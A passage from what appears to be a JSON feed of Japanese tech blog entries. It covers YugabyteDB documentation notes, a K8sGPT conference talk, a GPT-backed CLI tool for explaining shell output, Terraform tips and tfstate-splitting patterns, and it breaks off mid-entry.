YB-TServersYB-Masterは全てのテーブルとそれらをホストするYB-TServerの情報を保存している。一般のクライアントではそれらの情報はクライアントからクエリレイヤなどを通して取得された上で、クライアントにメタデータを返しデータアクセスが行なわれる。一方でスマートクライアントではYB-Masterに保存されたメタデータを利用して特定のYB-TServerが保持するタブレットやキャッシュを利用することが出来るため、データアクセス時のネットワークをまたぐ通信を減らすことができパフォーマンスを高めることができる。Background operationsいくつかのオペレーションはUniverseのライフタイムを通してバックグラウンドで行なうことで、フォアグラウンドのRead/Writeに影響を与えずに実行することが出来る。Data placement and load balancingYB-MasterのリーダーはCREATE TABLE時にタブレットの初期配置をYB-TServerをまたいで行なう。そのときにユーザー定義のデータ配置制約を強制し均一な読み込みを保証する。Universeのライフタイム中のノード追加や障害が発生しても、負荷分散を継続しデータ配置の制約を自動的に適用する。Leader balancing複数のYB-TServerに配置されたタブレットへのアクセスがUniverseをまたいで分散されることを保証している一方で、YB-Masterは対象となるノード1間でそれぞれのノードが同じ数のtablet-peer leader2をもつことを保証する。Rereplication of data on extended YB-TServer failureYB-Masterは全てのYB-TServerからハードビートシグナルを受け取ることでYB-TServerの死活監視を行なっている。そしてYB-MasterはYB-TServerの異常を検知したときに、どれぐらいのあいだYB-TServerが異常であったかを追跡する。閾値を超えると、YB-Masterは障害中のYB-TServerに配置されていたタブレットを再配置するYB-TServerを探し、レプリケーションを実行する。レプリケーションはYB-Masterリーダーに抑制された状態で実行されるため、Universeのフォアグラウンドオペレーションには影響をおよぼさない。Raft Groupのリーダーになれるノード↩↩","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/4_key_concepts_yb_master_service","isoDate":"2023-08-03T14:48:34.000Z","dateMiliSeconds":1691074114000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"K8sGPT Deep Dive というタイトルで登壇しました #CNDF","contentSnippet":"概要CloudNative Days Fukuoka 2023というイベントに『K8sGPT Deep Dive KubernetesクラスタのAI駆動型分析について』というタイトルで登壇しました。クラウドネイティブとAIを組み合わせることの深い洞察を共有することができ、私自身がエンジニアとして働くなかで、K8sGPTの最新の進化とその可能性について詳しく語る機会はなかなかなく、この経験を活かしていきたい。資料を作っている中で話したいことがどんどん増えていってめちゃくちゃ困った。また、その中でAIOpsについても触れることができ、非常に充実した時間でした。AIOpsはAIと運用管理の統合を指し、それによりIT運用の効率化や自動化が可能となります。その重要性と可能性を伝えることができたので良かった。登壇が終わった今でも、K8sGPTやAIOpsについてさらに知識を深め、クラウドネイティブの世界にどのように最適化された解決策を提供できるかについて考え続けています。参加者の皆さんからもたくさんのフィードバックを頂き、今後の研究や開発の参考になりました。私がこのプレゼンテーションのために読み込んだ複数の本の中で、特に皆さんにお勧めしたい一冊を挙げるとすれば、「大規模言語モデルは新たな知能か――ChatGPTが変えた世界」だと言えます。なぜなら、専門家でも初心者でも、難解な数学を使わずに重要な概念を理解できるように作られているからです。大規模言語モデルは新たな知能か　ＣｈａｔＧＰＴが変えた世界 (岩波科学ライブラリー)作者:岡野原 大輔岩波書店Amazon資料登壇資料になります。このブログの目的は参考資料をいちいち探さなくていいようにありますのでご活用ください。 speakerdeck.com参考文献公式ページ | K8sGPTGitHub | K8sGPTGitHub | K8sGPT OperatorDocs | K8sGPTOperator patternK8sGPT OperatorHow to Get Started With AIOpsPrompt Engineering Guideオブザーバビリティ・エンジニアリングKubernetes基盤を自律的に支えるController化の実装Tips / forkwell-202303-amsy810-k8sAutomation and Machine Learning with Site Reliability EngineeringTEMPLE: Six Pillars of ObservabilityAI時代に向けたクラウドにおける信頼性エンジニアリングの未来構想 / DICOMO2022\xa06A-1大規模言語モデルは新たな知能か――ChatGPTが変えた世界 (岩波科学ライブラリー)ChatGPTの頭の中 (ハヤカワ新書)言語の本質　ことばはどう生まれ、進化したかAI vs. 教科書が読めない子どもたち【ITIL4公認】ITIL 4の基本 図解と実践","link":"https://syu-m-5151.hatenablog.com/entry/2023/08/03/155326","isoDate":"2023-08-03T06:53:26.000Z","dateMiliSeconds":1691045606000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"k8sgpt Deep Dive: KubernetesクラスタのAI駆動型分析について","contentSnippet":"k8sgpt Deep Dive: KubernetesクラスタのAI駆動型分析についてというタイトルで登壇しました\\r\\r2023年8月3日 CloudNative Days Fukuoka 2023\\rhttps://event.cloudnativedays.jp/cndf2023\\r\\rk8sgpt Deep Dive: KubernetesクラスタのAI駆動型分析について\\rhttps://event.cloudnativedays.jp/cndf2023/talks/1885\\r\\rK8sGPT Deep Dive というタイトルで登壇しました #CNDF - じゃあ、おうちで学べる  \\rhttps://syu-m-5151.hatenablog.com/entry/2023/08/03/155326","link":"https://speakerdeck.com/nwiizo/k8sgpt-deep-dive-kuberneteskurasutanoaiqu-dong-xing-fen-xi-nituite","isoDate":"2023-08-03T04:00:00.000Z","dateMiliSeconds":1691035200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"YugabyteDBのドキュメントを全部読む Day3","contentSnippet":"YugabyteDBのドキュメントを全部読む Day3前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > Universeを読みました。今回はArchitecture > Key Concepts > YB-TServer serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。それはそれとして技術系の単語をカタカナ表記で誤魔化していて、体系的に学んでいないことがバレてしまう。特にストレージまわりが分からない……YB-TServer serviceYB-TServer(YugabyteDB Tablet Servcer)はユーザからの受けつけたYugabyteDBクラスタへのリクエストのI/Oの処理をする。テーブルのデータは一つ以上のTablet peerに分割(シャーディング)される。peerの数はレプリケーションファクターによって決定される。YB-TServerは一つ以上のTablet peerをホストする。Tablet peerはRaftグループを形成してグループ間でデータの複製を行ない、タブレットはYB-TServer上で最大の効率になるように管理される。Server-global block cacheブロックキャッシュは一つTB-TServer上の異なるタブレット間で共有される。YB-TServerのメモリ効率は一つのテーブルからの読み込みが多いほど最適化される。Space AmplificationYugabyteDBではSize-tired Compactionというライトアンプリフィケーション1が小さい圧縮方式を利用している。Size-tired Compactionはスペースアンプリフィケーション2が大きいという問題があるが、YugabyteDBではテーブルは複数のタブレットに分割され、タブレット間でのConcurrent Compactionは特定の最大値まで絞られるため問題になりにくい。YugabyteDBでは凡そ10-20%のスペースアンプリフィケーションにおさまる。つまりSize-tired Compaction一単位が扱うデータ量を小さく(タブレット化)して、同時に実行される圧縮処理数を絞ることで特定のタイミングで圧縮に使用されるストレージ容量を抑えているということ？Throttled compactionsYB-TServerではタブレット間で実行される圧縮処理の同時実行数を制限することで、圧縮処理が多量のリソースを占有することを防いでいる。この機能は圧縮されるファイル同士のサイズを比べ、実行される圧縮処理が妥当であることを確認することで実現されている。Small and large compaction queuesYB-TServerでは圧縮処理を大きい圧縮処理と小さい圧縮処理に分けて優先度を決めることで、I/Oが大きな場合でもシステムの機能を保っている。YugabyteDBでは圧縮処理数を制限することに加え、様々な最適化を実行することで圧縮処理の影響を最小化している。Manual compactionYugabyteDBではyb-admin utilityのcompact_tableコマンドにより、任意のタイミングでテーブルに対して圧縮を実行することが出来る。この方法はデータが新しく書き込まれない場合や、DDLやTTLの超過によるデータ削除時によりデータが断片化したときに有効である。Statistics-based full compactions to improve read performanceYugabyteDBでは読み込まれたkey-valueペアをDocDBレベルで監視している。監視対象となる時間軸はauto-compact-stat-window-secondsで管理されている。YugabyteDBがデータ読み込み時に多量の廃棄されたデータのスキップを検知した場合、full compactionがトリガーされ不要なキーの削除が行なわれる。Full compactionがトリガーされる詳細な条件は対象の時間軸で以下が満された時である。廃棄されたキーとアクティブなキーが読まれる割り合いがauto-compact-percent-obsoleteで定義された閾値を超たとき。廃棄されたキーの読み込みauto-compact-min-obsolete-keys-foundで定義された閾値を超たとき。この機能はTTLを設定したテーブルと互換性があり、TTL file expirationが有効なテーブルではスケジュールされた圧縮を実行しない。Scheduled full compactionsYugabyteDBでは全てのデータに対するデータ圧縮をスケジュール実行することが出来る。スケジュール実行はscheduled-full-compaction-frequency-hoursとscheduled-full-compaction-jitter-factor-percentageのフラグで管理される。この機能は大量のDELETEとUPDATEを定常的に実行するワークロードでのパフォーマンスとディスクスペースの再割り当てに有効である。スケジュール化したデータ圧縮はTTLと互換しているが、TTL file expirationとは互換していない。つまりスケジュールされた圧縮は実行されない。Server-global memstore limitServer-global memstore limitは一つのYB-TServer上のタブレット間でシェアされるメモリサイズを追跡し、強制する。この機能はタブレット間の書き込みに偏りがある場合に有効である。一つのテーブルに書き込みが集中しているばあい、メモリ制限以上のメモリを割り当てることでパフォーマンスを向上させることが出来る。Auto-sizing of block cache and memstoreBlock Cacheとmemstoreは何れも多量のメモリを使用している。これらはtablet-peer間で共有されるリソースのため、メモリ管理とこれらのコンポーネントの様々な環境に合せたサイジングを容易にしている。YB-TServerでは自動で特定の割合のメモリをBlock CacheとMemstoreに割り当てる。Distributing tablet load uniformly across data disks複数のSSDを利用するハードウェアでは、テーブルのデータ(SSTable)とWALはテーブル毎に利用可能なディスクに均等に分散される。このストライピングと呼ばれる負荷分散は、それぞれのディスクがそれぞれのテーブルの負荷を均等に処理することを保証する。SSDで実際に書き込んだデータより書き込み量が増幅する現象。もちろんライトアンプリフィケーションが小さいほうが望ましい。↩↩","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/3_key_concepts_yb_tserver_service","isoDate":"2023-08-02T16:13:24.000Z","dateMiliSeconds":1690992804000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"NFT技術概論","contentSnippet":"https://event.ospn.jp/osc2023-online-kyoto/session/1049448\\rOSC Onlineにて、ブロックチェーン上で表現されるNFT(Non Fungible Token:代替不能トークン)の技術概要についてお話ししました。\\r\\rブロックチェーン、イーサリアム・スマートコントラクトに触れた後、イーサリアム上でNFTを表現するためのERC721規格や、NFTでは画像データを保存するのに使われる分散ストレージのIPFS(InterPlanetary File System)について解説しています。","link":"https://speakerdeck.com/shukob/nftji-shu-gai-lun","isoDate":"2023-07-29T04:00:00.000Z","dateMiliSeconds":1690603200000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"YugabyteDBのドキュメントを全部読む Day2","contentSnippet":"YugabyteDBのドキュメントを全部読む Day2前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Design goalsを読みました。今回はArchitecture > Key Concepts > Universeを読みます。また画像は同ドキュメントより引用しています。UniverseYugabyteDBは耐久性とスケーラビリティを兼ねそなえた分散データベースを達成するために、Universe1と呼ばれるノードのグループを持っている。Universeはビジネス要件やレイテンシの兼ね合いでシングルゾーン、単一リージョンマルチゾーン、マルチリージョン、同期・非同期レプリケーションなどを選択することが出来る。UnivereはClusterと表現されることもある。データの構成Universeは一つ以上のネームスペースを持つことができ、またネームスペースは一つ以上のテーブルを持つことができる。YugabyteDBではUniverse上に存在するノードにまたがって保持されるテーブルを設定に従って、シャーディングし、レプリケーション、ロードバランシングを行なう。YugabyteDBはノードやディスク、ゾーンなどに発生した障害に自動で対応し、必要であればデータを新規に分散、レプリケーションを行なう。ネームスペースはYSQLではデータベースに対応し、ほかのDBにおけるネームスペースに対応する2。YCQLではキースペースに対応し、Cassandraのキースペースに対応している。サービスコンポーネントUniverseはYugabyteDB Tablet Server(YB-TServer)とYugabyteDB Master Server(YB-Master)の二つで構成されている。YB-MasterとYB-TServerはRaftにより分散されており、高可用性を達成している。YB-Tserverはテーブルを始めとしたユーザーデータの保存、提供を担当する。YB-Masterはシステムのメタデータを管理し、システム全体のテーブルに対するDDLやメンテナンスの実行、ロードバランシングといったオペレーションを管理する。UniverseとClusterUniverseは一つのプライマリクラスタとゼロ個以上のレプリカクラスタによって構成されている。プライマリクラスタプライマリクラスタはRead/Write両方の実行と、プライマリクラスタ内のノード間の同期的なレプリケーションを担当する。リードレプリカクラスタリードレプリカクラスタはRead処理のみを実行する。Write処理は自動的にプライマリクラスタにルーティングされる。リードレプリカクラスタを利用することで、地理的に分散したデータに対する読み取りの遅延を小さくすることができる。データはプライマリクラスタから非同期的にとりこまれる。これはRaftの書き込みには関与しないRaftオブザーバとして機能する。GoogleのCloud Spannerでも同様にUniverseと呼ばれている↩PostgreSQLではSchemaの裏側に存在するデータ構造↩","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/2_key_concepts_universe","isoDate":"2023-07-26T15:03:13.000Z","dateMiliSeconds":1690383793000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day1","contentSnippet":"Day1最近Twitter改めXで「俺はDBのドキュメント端から端まで読んで強くなった」というX\'s1を複数みかけました。周りのエンジニアに一歩差をつける方法として、フレームワークやミドルウェアやライブラリのドキュメントを最初から最後までちゃんと読む、というのがあって、これはマジでコスパ抜群です。— 徳永広夢 (@tokuhirom) July 21, 2023 確かに私のRedisはこれ。 https://t.co/2y1E01aLGw— maru (@maruloop) July 22, 2023 私のMySQLもこれ。 https://t.co/BxiOjeQVPk— yoku0825 (@yoku0825) July 22, 2023 俺のpostgresqlもこれ。 https://t.co/URRjyXCpGI— そーだい@初代ALF (@soudai1025) July 22, 2023 PostgreSQL系NewSQLで最強になりたいのでYugabyteDBのドキュメントを順番に読んで行きます。ドキュメントはv2.19に対応したものです。手始めにArchitectureの一番先頭にあるDesign goalsから読みはじめます。また画像は同ドキュメントより引用しています。Design goalsYugabyteDBは以下を達成することを目標としている。1. 分散トランザクションを提供しながら強い一貫性を保証する。2. Query APIを再発明せず、既存のクエリ言語への互換を達成する。3. 高いパフォーマンスを保証する。4. 地理的に分散したデプロイを可能にする。5. Cloud Native Databaseとしてデザインする。一貫性分断耐性YugabyteDBはCAPの定理で言えばCPを中心に高い可用性を供えたデータベースネットワーク分断などを起因とするSplit BrainはRaft Group内であたらしいリーダーを選出することで対応している。YugabyteDBではLeader Leaseという障害が発生しても常に一つのリーダが存在することを保証する仕組みを実装している。直列化可能性single-row Linearizable writeをサポートしている。ACIDトランザクションYugabyteDBではSeriarizable、Repetable Read、Read Committed Isolationの三つの分離レベルをサポートしている。YSQL APIではこれら3つの分離レベルをサポートしているが、YCQLではRepeatable Readのみに対応している。Query APIYugabyteDBではYSQLとYCQLという2種類のQuery APIをサポートしている。YSQLYSQLはPostgreSQLに互換したAPIでPostgreSQLのクエリレイヤを再利用している。新しい変更は互換性を崩さない。YSQLは新しいPostgreSQLに互換しつづけることを目標としている。YCQLYCQLはCassandraのクエイ言語から派生した半リレーショナルなクエリ言語で、Webスケールな膨大なwriteに対応してスケールし素早いデータ取得を目標としている。パフォーマンスC++で実装されているため高いパフォーマンスと巨大なHeap(RAM)をCacheとして利用できる。SSDとNVMeに最適化している。高いWriteスループットとクライアントの同時実行性、高いデータ密度、増加し続けるデータへの対応を目標としている。地理的分散Zone、Multi Region、Multi Cloudいずれにも対応している。これに対応するために、ノード障害やトラヒックのルーティングなどに対応できる必要がある。クラウドネイティブアーキテクチャパブリッククラウドやオンプレミスで利用される一般てきなハードウェアで利用可能にする。原子時計のような特別なものに依存しない。Kubernatesに対応している。OSSで提供している。https://twitter.com/SawyerMerritt/status/1683365478582951936↩","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/1_design_goals","isoDate":"2023-07-25T15:01:52.000Z","dateMiliSeconds":1690297312000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Terraformでmapにkeyが含まれないときにスキップしたい","contentSnippet":"Google CloudではPublic IPを利用した際に割り振られる可能性のあるCIDRの一覧がcloud.jsonでJSON形式で公開されています。この記事は雑な検証用のTerraformで承認済みネットワークにasia-notheast1のCIDRを全部登録してやろうとしたとき、上記のJSONファイルからscopeがasia-northeast1のprefixes.ipv4Prefixを抜きだそうとしたときにハマったのでその対応方法のメモです 結論以下のような感じで書いたら対応できました。contains(keys(hoge), \\"fuga\\") # hogeのkeyにh...","link":"https://zenn.dev/nnaka2992/articles/skip_when_key_does_not_exists_in_map_terraform","isoDate":"2023-07-22T14:53:12.000Z","dateMiliSeconds":1690037592000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Four Keys とは？考え方から導入まで徹底検証してみた","contentSnippet":"はじめに Sreake事業部でインターンをしている村山です。私は以前に、2022年のAccelerate State of DevOps Reportについて調査を行いました。DevOps Reportでは、Four K […]The post Four Keys とは？考え方から導入まで徹底検証してみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-four-keys/","isoDate":"2023-07-21T09:56:19.000Z","dateMiliSeconds":1689933379000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes の upstream のキャッチアップ","contentSnippet":"先日、Kubernetes Meetup Tokyo #59 で「KEP から眺める Kubernetes」というタイトルで発表しました。発表の後で Kubernetes の upstream のキャッチアップ方法について質問を受けました。その場で回答はしたのですが、ちょうど社内の共有会で似たような話をしたところだったので、加筆修正したものを公開しておきます。 はじめにKubernetes の upstream を追いかけ始めて 1 年ちょっと経ったので、その経験をまとめます。Kubernetes の upstream やエコシステムを観察しているだけで、コントリビュータではありま...","link":"https://zenn.dev/toversus/articles/52b107ab103712","isoDate":"2023-07-20T10:18:32.000Z","dateMiliSeconds":1689848312000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"CLIの実行結果を正しく理解することを促すツールを作成しました。","contentSnippet":"概要AIの技術は目覚ましい進歩を遂げています。特に自然言語処理（NLP）の分野では、GPT-4のようなモデルが人間に近いレベルで文章を理解し、生成することができるようになりました。しかし、これらのモデルを日々の業務や作業にどのように活用すればよいのか、多くの人々がまだ手探りの状態です。一方、コマンドラインは、システム管理者やソフトウェア開発者にとって重要なツールです。コマンドラインからシステムの状態を調べたり、プログラムを実行したりするためには、これらで利用するコマンドの理解とそれらを十分に使いこなすことが必要です。netflixtechblog.comアフィリエイトでも何でもなく運用で利用するコマンドについてはLinuCなどもあるので教材を読むだけでもおすすめしたい。linuc.orgでは、AIがコマンドプロンプトの結果を理解し、それを人間がより理解しやすい形で説明することができたら、どうでしょうか？ここで、AICommandを紹介します。AICommandは、コマンドプロンプトの実行とその結果の解釈を統合したツールであり、AIの力を借りてコマンドプロンプトの結果を理解する新しい試みです。今回の記事では、このAICommandについて詳しく見ていきましょう。シェルコマンドの実行とその結果をOpenAIのGPTモデルに結果を送信し解説を要求するGo製CLIツールです。コマンドの処理状況も視覚的に表示します。 pic.twitter.com/5q6jqyWbsx— nwiizo (@nwiizo) 2023年7月18日  AICommandの紹介AICommandは、コマンドプロンプトの結果を人間が理解しやすい形に解釈するための新しいツールです。OpenAIの強力な自然言語処理モデルを使用して、コマンドラインから得られた情報を詳細に解析し、その結果を説明します。これにより、複雑なコマンドの実行結果も、非専門家でも簡単に理解できるようになります。github.comコマンドプロンプトは非常に強力で、システムの管理やデータの分析には欠かせないツールですが、その結果を正しく理解するには専門知識が必要で、学習コストが高いという課題がありました。しかし、AICommandを使えば、そのハードルが大きく下がります。たとえば、システムのログを確認するためのコマンドを実行した結果を、AIが解釈し、重要なポイントをハイライトしてくれます。さらに、その結果がどういう意味を持つのか、何が原因でそうなったのかといった情報も提供してくれます。このように、AICommandは、AIの能力を利用して、コマンドプロンプトの利用をより手軽で、より理解しやすいものに変えることを目指しています。ソフトウェア開発者やシステム管理者だけでなく、コマンドラインを利用するすべての人々にとって、新たな可能性を広げるツールとなることを目指します。option で日本語にも対応してます。 pic.twitter.com/AkEHh5syPx— nwiizo (@nwiizo) 2023年7月19日  Setup \uD83D\uDD27AICommandはGo言語で書かれているため、Goの開発環境が必要です。まず、Goがまだインストールされていない場合は、公式のインストールガイドに従ってGoをインストールしてください。Install aicommandGoがインストールされたら、次にAICommandをインストールします。go install github.com/nwiizo/aicommand@latestSet the your_api_keyAICommandはOpenAIのGPTモデルを使用しますので、OpenAIのAPIキーが必要となります。OpenAIのアカウントを持っていてAPIキーを取得済みの場合は、そのAPIキーを使用します。まだAPIキーを取得していない場合は、OpenAIの公式ドキュメントを参照してAPIキーを取得してください。APIキーを取得したら、そのキーを環境変数 OPENAI_API_KEYに設定します。設定方法は以下の通りです：export OPENAI_API_KEY=your_api_keyUsage ⏳コマンドの実行とその結果の解釈を行うには、次のように execute コマンドに続けて実行したいコマンドを引数として与えます。コマンドは(ダブル)クオーテーションで囲む必要があります。aicommand execute \\"your-shell-command\\"たとえば、ディレクトリの内容をリストする ls -la コマンドの結果を解釈させたい場合は、次のように実行します。aicommand execute \\"ls -la\\"すると、AICommandは ls -la コマンドを実行し、その結果を解釈して人間が理解しやすい形で説明します。また、解釈結果の言語を指定したい場合は、 --language または-lオプションを使用します。現在、英語（en）と日本語（ja）がサポートされています。デフォルトの言語は英語です。aicommand execute --language ja \\"ls -la\\"さらに、使用するGPTモデルを指定することも可能です。これは --model または -m オプションで指定します。デフォルトは gpt-3.5-turbo です。aicommand execute --model gpt-3.5-turbo \\"ls -la\\"これでAICommandの基本的な使用方法について説明しました。コマンドプロンプトの結果の解釈がこれまで以上に手軽になり、より深い理解が可能になります。AICommandの可能性\uD83E\uDD16AICommandは、私たちが普段利用しているコマンドプロンプトをOpenAIのGPTモデルと組み合わせることで新たな可能性を生み出します。たとえば、複雑なコマンドを実行した結果の意味を理解することが困難な場合や、ログの解析、データ分析などで結果をより深く理解するための手助けとなります。また、様々なプログラムやスクリプトの実行結果を人間が理解できる形で説明してくれるため、デバッグやエラー解析の作業を効率化することが可能です。AICommandを利用すれば、テクニカルな知識がなくてもコマンドラインから得られる情報を理解しやすくなるかもしれません。結論\uD83E\uDDBEAICommandは、AIとCLI（Command Line Interface）の架け橋となるツールであり、この2つの強力なテクノロジーを組み合わせることで、未知の課題に対して新たな視点を提供します。さまざまなバックグラウンドを持つユーザーがコマンドラインから得られる情報をより容易に理解できるようになることで、これまで手が出せなかった問題に取り組む手助けをしてくれるでしょう。しかし、その一方で、AICommandはコマンドプロンプトの出力を人間が理解できる形で解釈するツールであるため、その解釈は絶対的な真実を表すものではありません。AICommandの解釈結果は参考の一つと考え、最終的な意思決定はユーザー自身の判断に任せるべきです。以上のことを念頭に置いて、AICommandを活用すれば、新たな視点からコマンドラインの世界を探索することが可能になるでしょう。ソフトウェア開発にChatGPTは使えるのか？――設計からコーディングまでAIの限界を探る作者:小野 哲技術評論社AmazonCloudNative Days Fukuoka 2023 にて登壇余談なのですが\\"k8sgpt Deep Dive: KubernetesクラスタのAI駆動型分析について” というタイトルで登壇を行います。event.cloudnativedays.jp参考AI時代に向けたクラウドにおける信頼性エンジニアリングの未来構想 / DICOMO2022 6A-1AICommand GitHubリポジトリOpenAIsashabaranov/go-openai","link":"https://syu-m-5151.hatenablog.com/entry/2023/07/19/162657","isoDate":"2023-07-19T07:26:57.000Z","dateMiliSeconds":1689751617000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"成熟度モデルを活用したCloud Nativeへの道筋 という副題で登壇します #開発生産性con_findy","contentSnippet":"概要開発生産性Conferenceというイベントに『Cloud Native の作法 - 成熟度モデルを活用したCloud Nativeへの道筋』というタイトルで登壇しました。生産性に関するイベントなんですけど現場のエンジニアをやっている僕には開発生産性について語ることってあんまりないようなーって思いながら最近、成熟度モデルについて調べていたのでこのタイトルにしました。途中で開発生産性について語るのを諦めてガッツリ資料を作り直しましたので生暖かく見守ってください。あと、ちょっと前に書籍を送って頂きましたが\uD83D\uDCD6 Twitter での告知を忘れていたのでしておきます。読んだ感想としては入門書では決してないですが成熟度モデルでいうとレベル2の段階では読んでほしいと思う書籍になります。また、豊富にドキュメントへのリンクが貼ってあるのでKubernetesという荒野に道を示す地図になると思います(この文章はChatGPTではなく俺が生成した)。Kubernetesの知識地図 —— 現場での基礎から本番運用まで作者:青山 真也,小竹 智士,長谷川 誠,川部 勝也,岩井 佑樹,杉浦 智基技術評論社Amazon資料登壇資料になります。このブログの目的は参考資料をいちいち探さなくていいようにありますのでご活用ください。 speakerdeck.com参考文献Cloud Native Maturity ModelCloud Native TransformationDesign Patterns for Cloud Native ApplicationsIntro to the Cloud Native Maturity Model - Danielle Cook, Simon Forster, Robbie Glenn & John FormanSRE サイトリライアビリティエンジニアリングが”ザックリ”「すっきり」分かる本: Googleが実践している新DevOps方法論SRE サイトリライアビリティエンジニアリングサイトリライアビリティワークブックCloud Native成熟度モデルがWeb公開されましたWhat\'s the Difference Between DevOps and SRE?Solving Reliability Fears with Site Reliability EngineeringReliability When Everything Is a Platform: Why You Need to SRE Your CustomersThe History of DevOps ReportsEffective DevOpsPlatform\xa0Engineeringへの招待Platform Team と 社内政治 〜 出でよ、Platform Champion 〜 / Platform Team and Internal Politics - Platform Engineering Meetup\xa0#2Platform Engineering at\xa0MercariEMPOWERED 普通のチームが並外れた製品を生み出すプロダクトリーダーシッププロダクトマネジメントのすべて 事業戦略・IT開発・UXデザイン・マーケティングからチーム・組織運営まで正しいものを正しくつくる　プロダクトをつくるとはどういうことなのか、あるいはアジャイルのその先についてエンジニアリング組織論への招待　～不確実性に向き合う思考と組織のリファクタリング","link":"https://syu-m-5151.hatenablog.com/entry/2023/07/13/131433","isoDate":"2023-07-13T04:14:33.000Z","dateMiliSeconds":1689221673000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Cloud Native の作法","contentSnippet":"2023年7月13日 \\r\\r成熟度モデルを活用したCloud Nativeへの道筋 という副題で登壇します #開発生産性con_findy\\rhttps://syu-m-5151.hatenablog.com/entry/2023/07/13/131433\\r\\r\\r開発生産性Conference の登壇資料\\rhttps://findy.connpass.com/event/283417/","link":"https://speakerdeck.com/nwiizo/cloud-native-nozuo-fa","isoDate":"2023-07-13T04:00:00.000Z","dateMiliSeconds":1689220800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"OpenAI APIを利用してパブリッククラウドの権限要約をしてくれるCLIコマンドを作成した","contentSnippet":"はじめに Sreake事業部の橋本です。前回の記事から引き続き、OpenAIのGPTモデルを利用してDevOps、SREの領域でのtext AIの有効活用を考えていきます。 運用の自動化、構築支援などに活用できると嬉しい […]The post OpenAI APIを利用してパブリッククラウドの権限要約をしてくれるCLIコマンドを作成した first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/summarize-permission-with-openai/","isoDate":"2023-07-11T07:01:52.000Z","dateMiliSeconds":1689058912000,"authorName":"Sreake","authorId":"Sreake"},{"title":"メールが届いたら Google Home で音声で通知する","contentSnippet":"以前、「 LINE に送ったメッセージを Google Home に読み上げさせる」という記事を書きました。 その時に作ったものに家にあるラズパイで Cloud PubSub を subscribe してメッセージが届いたらその内容を Text-to-Speach で","link":"https://blog.1q77.com/2023/07/ses-lambda-and-cloud-pubsub/","isoDate":"2023-07-10T14:25:35.000Z","dateMiliSeconds":1688999135000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"【Terraform\uD83E\uDDD1‍\uD83D\uDE80】tfstateファイルの分割パターンとディレクトリ構成への適用","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Terraformのtfstateファイルを分割する目的と、オススメの分割パターンについて (★)Terraformのリポジトリやリモートバックエンドのディレクトリ構成の設計について記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜ tfstate ファイルを分割するのか分割していない場合分割している場合分割しなくていい場合03. tfstate ファイルの分割分割の境界状態の依存関係図依存関係図とは依存関係の表現▼ 依存関係の表現記法▼ 依存関係がない場合▼ 依存関係がある場合04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ディレクトリ \uD83D\uDCC2 構成リモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割ディレクトリ構成05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成AWSリソース別のdataブロックの場合AWSリソース別のdataブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成06. tfstate ファイルの分割パターンオススメな設計の一覧大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合リモートバックエンドの場合07. 上層の分割 (推奨)上層の分割についてプロバイダーのアカウント別 - ★★★この分割方法について【プロバイダーアカウント別】状態の依存関係図【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合08. 下層の分割 (推奨)下層の分割について実行環境別 - ★★★この分割方法について【実行環境別】状態の依存関係図【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合09. 中間層の分割 (任意)中間層の分割について運用チーム責務範囲別 - ★★この分割方法について【チーム別】状態の依存関係図【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合プロダクトのサブコンポーネント別 - ★★この分割方法について【サブコンポーネント別】状態の依存関係図【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 